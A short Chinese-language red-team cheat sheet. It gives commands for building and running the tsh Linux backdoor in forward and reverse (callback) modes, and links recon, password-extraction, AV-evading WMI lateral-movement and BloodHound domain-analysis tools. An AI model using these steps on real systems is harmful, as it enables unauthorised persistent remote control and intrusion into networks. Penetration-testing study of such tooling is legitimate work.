# 0x01 后门远控C2
待测试
```
Linux后门
https://github.com/orangetw/tsh

正向
vim tsh.h
#删除两个call_back字段
设置密码
make linux
执行./tshd
在控制端执行./tsh ip

反向
git clone https://github.com/orangetw/tsh.git
cd tsh
vim tsh.h
#控制端
make linux
./tsh cb
#被控端
umask 077; HOME=/var/tmp ./tshd
./tshd
```

# 0x01 主机信息收集
待测试
```
ASPX网站数据库密码加密存储
https://github.com/aleenzz/InjectSQLServer

https://github.com/GhostPack/Seatbelt
```
# 0x02 内网信息探测
待测试
```
nltest
```
# 0x03 内网服务攻击
域环境下常规打法：上传bloodbound客户端搜集域内信息，把结果回传本地后，利用kali的bloodbound服务端解析，分析域内的薄弱环节
```
【免杀的】横向移动命令执行
https://github.com/rootclay/WMIHACKER
```
# 参考
```
https://github.com/safe6Sec/command

https://mp.weixin.qq.com/s/tqd9jJJv4bmzN6xVdpGDow
```